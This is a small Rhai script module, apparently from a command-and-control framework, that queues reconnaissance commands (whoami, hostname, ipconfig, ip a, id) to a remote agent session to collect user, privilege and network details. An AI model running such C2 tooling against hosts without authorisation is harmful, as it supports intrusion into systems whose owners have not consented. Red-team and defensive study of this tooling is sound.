// modules/recon.rhai
// Basic host reconnaissance. All OS commands require the "shell " prefix
// so the agent's built-in command dispatcher passes them to the OS shell.
fn run(session_id) {
    print("Module 'Recon' started for Session: " + session_id);

    // Cross-platform: whoami and hostname work on both Linux and Windows
    send_c2_command(session_id, "shell whoami");
    send_c2_command(session_id, "shell hostname");

    // OS-specific network info — send both; one will succeed
    send_c2_command(session_id, "shell ipconfig");   // Windows
    send_c2_command(session_id, "shell ip a");        // Linux

    // OS-specific user/group info
    send_c2_command(session_id, "shell whoami /all"); // Windows: groups + privs
    send_c2_command(session_id, "shell id");          // Linux: uid/gid

    return "Recon commands queued for Session " + session_id;
}
